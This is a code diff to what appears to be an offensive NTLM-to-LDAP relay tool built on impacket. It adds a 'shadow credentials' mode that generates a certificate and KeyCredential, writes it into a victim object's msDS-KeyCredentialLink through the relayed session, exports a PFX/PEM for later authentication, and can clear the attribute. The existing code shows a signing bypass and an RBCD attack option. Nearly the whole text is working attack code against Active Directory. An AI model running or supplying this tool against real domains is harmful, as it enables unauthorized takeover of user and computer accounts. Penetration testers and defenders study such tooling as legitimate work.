@@ -1,4 +1,3 @@
-#!/usr/bin/env python3
 import argparse
 import os
 import random
@@ -11,6 +10,23 @@ from struct import unpack
 
 from impacket.examples.utils import parse_target
 
+import re
+import string
+
+from cryptography import x509
+from cryptography.hazmat.primitives.serialization.pkcs12 import serialize_key_and_certificates
+from cryptography.hazmat.primitives.serialization import BestAvailableEncryption, NoEncryption
+from cryptography.hazmat.primitives import serialization
+from cryptography.hazmat.backends import default_backend
+
+from dsinternals.system.Guid import Guid
+from dsinternals.system.DateTime import DateTime
+from dsinternals.common.cryptography.X509Certificate2 import X509Certificate2
+from dsinternals.common.data.hello.KeyCredential import KeyCredential
+
+import warnings
+from cryptography.utils import CryptographyDeprecationWarning
+warnings.filterwarnings("ignore", category=CryptographyDeprecationWarning)
 
 def build_parser():
     parser = argparse.ArgumentParser(
@@ -55,6 +71,21 @@ def build_parser():
     payload.add_argument("-value-hex", action="store", help="binary attribute value as hex")
     payload.add_argument("-rbcd-sid", action="store", metavar="SID",
                          help="write an RBCD descriptor granting this SID (msDS-AllowedToActOnBehalfOfOtherIdentity)")
+    payload.add_argument("-shadow-creds", action="store_true",
+        help="Generate a shadow credential certificate and insert it into msDS-KeyCredentialLink "
+        "attribute, use modify-dn entry for the certificate generation")
+
+    sc_group = parser.add_argument_group(
+        "shadow credentials options (only valid with -shadow-creds)"
+    )
+    sc_group.add_argument("-sc-export", choices=["PEM", "PFX"], type=lambda s: s.upper(),
+        default="PFX", help="shadow creds certificate export format (default: PFX)")
+    sc_group.add_argument("-sc-filename", default=None,
+        help="name of the generated certificate (default: common name of the object)")
+    sc_group.add_argument("-sc-password", default=None,
+        help="password for the PFX (default: random)")
+    sc_group.add_argument("-sc-delete", action="store_true",
+        default=False, help="Force the deletion of msDS-KeyCredentialLink")
     return parser
 
 
@@ -86,6 +117,94 @@ from impacket.ldap.ldapasn1 import BindRequest, LDAPMessage, ModifyRequest, Resu
 from impacket.nt_errors import STATUS_ACCESS_DENIED
 from impacket.spnego import SPNEGO_NegTokenInit, SPNEGO_NegTokenResp, TypesMech
 from pyasn1.codec.ber import decoder, encoder
+
+
+def random_string(length=8):
+    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))
+
+def extract_cn(dn):
+    match = re.match(r"CN=([^,]+)", dn, re.IGNORECASE)
+    if match:
+        return match.group(1)
+    return random_string(8)
+
+def export_pfx(pem_cert_file, pem_key_file, pfx_password, out_file):
+    with open(pem_cert_file, 'rb') as f:
+        pem_cert_data = f.read()
+    with open(pem_key_file, 'rb') as f:
+        pem_key_data = f.read()
+
+    cert_obj = x509.load_pem_x509_certificate(pem_cert_data, default_backend())
+    key_obj = serialization.load_pem_private_key(pem_key_data, password=None, backend=default_backend())
+
+    if pfx_password is None:
+        encryption_algo = NoEncryption()
+    else:
+        encryption_algo = BestAvailableEncryption(pfx_password.encode('utf-8'))
+
+    pfx_data = serialize_key_and_certificates(
+        name=b"ShadowCredentialCert",
+        key=key_obj,
+        cert=cert_obj,
+        cas=None,
+        encryption_algorithm=encryption_algo
+    )
+
+    with open(out_file, 'wb') as f:
+        f.write(pfx_data)
+
+
+def generate_shadow_credential(subject, owner_dn, export_type, password, path):
+    print("[+] Generate certificate")
+    certificate = X509Certificate2(subject=subject, keySize=2048, notBefore=(-40365), notAfter=(40365))
+
+    print("[*] Generate key credentials")
+    key_credential = KeyCredential.fromX509Certificate2(
+        certificate=certificate,
+        deviceId=Guid(),
+        owner=owner_dn,
+        currentTime=DateTime(),
+        isComputerKey=True
+    )
+    print(f"[+] KeyCredential generated with DeviceID: {key_credential.DeviceId.toFormatD()}")
+
+    if path is None:
+        path = random_string(8)
+        print(f"[i] No certificate filename found, will use: {path}")
+
+    if export_type == "PEM":
+        certificate.ExportPEM(path_to_files=path)
+        print(f"[+] Certificate PEM saved: {path}_cert.pem")
+        print(f"[+] Private key PEM saved: {path}_priv.pem")
+
+    elif export_type == "PFX":
+        if password is None:
+            password = random_string(20)
+            print(f"[i] no password found, will use password: {password}")
+
+        certificate.ExportPEM(path_to_files=path)
+        pem_cert_file = f"{path}_cert.pem"
+        pem_key_file = f"{path}_priv.pem"
+        out_pfx_file = f"{path}.pfx"
+
+        export_pfx(pem_cert_file, pem_key_file, password, out_pfx_file)
+        print(f"[+] PFX certifcate generated: {out_pfx_file}")
+        print(f"[i] PFX Password: {password}")
+
+    # Format LDIF complet : "B:<len>:<hex>:<DN>"
+    dn_with_binary_str = key_credential.toDNWithBinary().toString()
+    parts = dn_with_binary_str.split(':', 3)
+
+    if len(parts) >= 3:
+        print("\n" + "=" * 70)
+        print("[+] Value for msDS-KeyCredentialLink :")
+        print("=" * 70)
+        print(dn_with_binary_str)
+        print("=" * 70)
+        return dn_with_binary_str.encode()
+    else:
+        print("[!] Erreur: can't extract hexadecimal value")
+        return None
 
 
 def configure_smb_listener():
@@ -159,6 +278,23 @@ def operation_value():
         return "msDS-AllowedToActOnBehalfOfOtherIdentity", descriptor.getData()
     if args.value_hex:
         return args.attribute, bytes.fromhex(args.value_hex)
+    if args.shadow_creds:
+        owner_dn = args.modify_dn
+        cn_value = extract_cn(owner_dn)
+        subject = f"CN={cn_value}"
+        cert_filename = args.sc_filename
+        if args.sc_filename is None:
+            cert_filename = cn_value
+        value = generate_shadow_credential(
+            subject,
+            owner_dn,
+            args.sc_export,
+            args.sc_password,
+            cert_filename
+        )
+        if value is None:
+            parser.error("Failed to generate shadow credential")
+        return "msDS-KeyCredentialLink", value
     return args.attribute, args.value.encode()
 
 
@@ -170,6 +306,12 @@ def replace_attribute(attribute, value):
     request["changes"][0]["modification"]["vals"].setComponents(value)
     return request
 
+def clear_attribute(attribute):
+    request = ModifyRequest()
+    request["object"] = args.modify_dn
+    request["changes"][0]["operation"] = 1  # delete
+    request["changes"][0]["modification"]["type"] = attribute
+    return request
 
 def read_exact(sock, length):
     value = b""
@@ -250,7 +392,11 @@ class CrossUserLDAPRelayClient(ldaprelayclient.LDAPSRelayClient):
             final["mechListMIC"] = authenticateMessageBlob[-16:]
 
         bind_message = ldap_message(gss_token(final.getData()))
-        modify_message = ldap_message(replace_attribute(attribute, value))
+
+        if args.shadow_creds and args.sc_delete:
+            modify_message = ldap_message(clear_attribute(attribute))
+        else:
+            modify_message = ldap_message(replace_attribute(attribute, value))
 
         # The two messages, concatenated, protected as a single SASL record with the
         # attacker's own session key. This is the crux of the bypass.
@@ -276,6 +422,7 @@ class CrossUserLDAPRelayClient(ldaprelayclient.LDAPSRelayClient):
         # Close the victim's SMB exchange; relay/coercion tools may show FAILED anyway.
         return None, STATUS_ACCESS_DENIED
 
+    
     def _verify(self, attribute, value):
         """Independent signed connection read-back — the only reliable success signal."""
         time.sleep(1)
@@ -293,7 +440,26 @@ class CrossUserLDAPRelayClient(ldaprelayclient.LDAPSRelayClient):
             for entry in entries:
                 found.extend(item.asOctets() for item in get_entry_values(entry, attribute))
             check.close()
-            if value in found:
+
+            def extract_hex(raw):
+                """For DN-Binary syntax (e.g. msDS-KeyCredentialLink), extract only
+                the hex payload, ignoring DN formatting differences."""
+                try:
+                    text = raw.decode("utf-8", errors="ignore")
+                    parts = text.split(":", 3)
+                    if len(parts) >= 3 and parts[0] == "B":
+                        return parts[2].lower()
+                except Exception:
+                    pass
+                return None
+
+            expected_hex = extract_hex(value)
+            if expected_hex:
+                match = any(extract_hex(item) == expected_hex for item in found)
+            else:
+                match = value in found
+
+            if match:
                 print("[+] SUCCESS: target object now contains the attacker value", flush=True)
             else:
                 print("[-] target did not contain the requested value", flush=True)
